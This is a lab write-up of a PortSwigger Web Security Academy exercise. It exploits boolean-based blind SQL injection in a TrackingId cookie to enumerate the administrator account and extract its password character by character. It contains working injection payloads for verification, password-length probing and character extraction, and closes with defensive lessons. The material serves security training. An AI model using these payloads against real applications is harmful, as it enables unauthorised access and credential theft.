Objective
Exploit a Blind SQL Injection vulnerability using conditional responses to extract the administrator password and gain access to the target account.

Vulnerability Type
Blind SQL Injection (Boolean-Based)
Severity: Critical

Injection Point
Cookie Parameter:
TrackingId

Discovery Phase
The application did not:

Display SQL errors
Return database output
Reveal backend query results

Instead, application behavior changed depending on whether a database condition evaluated to TRUE or FALSE.
Indicator:
TRUE → "Welcome back" displayed
FALSE → "Welcome back" removed

Initial Verification
TRUE Condition:
' AND '1'='1
Result:
Welcome back displayed.
FALSE Condition:
' AND '1'='2
Result:
Welcome back disappeared.
Conclusion:
SQL Injection confirmed.

User Enumeration
Payload:
' AND (SELECT 'x' FROM users WHERE username='administrator')='x
Result:
Welcome back displayed.
Conclusion:
Administrator account exists.

Password Length Enumeration
Payload Template:
' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')>X--
Example:
' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')>19--
Result:
TRUE
Example:
' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')>20--
Result:
FALSE
Conclusion:
Administrator password length = 20 characters

Character Extraction
Payload Template:
' AND (SELECT SUBSTRING(password,[POSITION],1) FROM users WHERE username='administrator')='[CHAR]
Method:
Test each position individually.
Observe whether the "Welcome back" banner appears.
TRUE response = Correct character identified.

Tools Used

Firefox
Burp Suite Repeater
PortSwigger Web Security Academy


Key Lessons Learned


Blind SQL Injection does not require visible database output.


Small UI changes can act as powerful information leaks.


Boolean conditions can be used to extract sensitive data one character at a time.


Repeater is often more reliable than automation when dealing with rate limits or Community Edition restrictions.


Suppressing SQL errors alone does not eliminate SQL Injection risk.



Real-World Takeaway
Applications often attempt to hide database errors and sensitive output.
However, if application behavior changes based on backend query results, attackers can still infer and extract sensitive information through side-channel responses.
This demonstrates why parameterized queries and prepared statements remain essential defenses against SQL Injection attacks.
